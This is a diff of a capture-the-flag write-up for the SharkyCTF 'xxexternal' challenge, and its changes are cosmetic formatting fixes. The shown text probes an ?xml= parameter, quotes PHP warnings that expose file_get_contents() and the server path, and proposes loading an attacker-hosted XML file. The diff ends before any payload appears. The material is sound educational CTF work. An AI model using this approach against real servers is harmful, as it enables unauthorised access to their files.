@@ -100,7 +100,7 @@ I tried some payload.
 http://xxexternalxx.sharkyctf.xyz/?xml=asdf
 ```
 Response
-```
+```html
 <br />
 <b>Warning</b>:  file_get_contents(asdf): failed to open stream: No such file or directory in <b>/var/www/html/index.php</b> on line <b>20</b><br />
 <br />
@@ -110,7 +110,7 @@ Response
 <br />
 <b>Notice</b>:  Trying to get property 'data' of non-object in <b>/var/www/html/index.php</b> on line <b>25</b><br />
 ```
-We have ```file_get_contents()``` function in php, so I can add link as http://example.com/file.xml and execute file .xml,
+We have ```file_get_contents()``` function in PHP, so I can add link as http://example.com/file.xml and execute file .xml,
 and file data.xml like:
 ```xml
 <root>
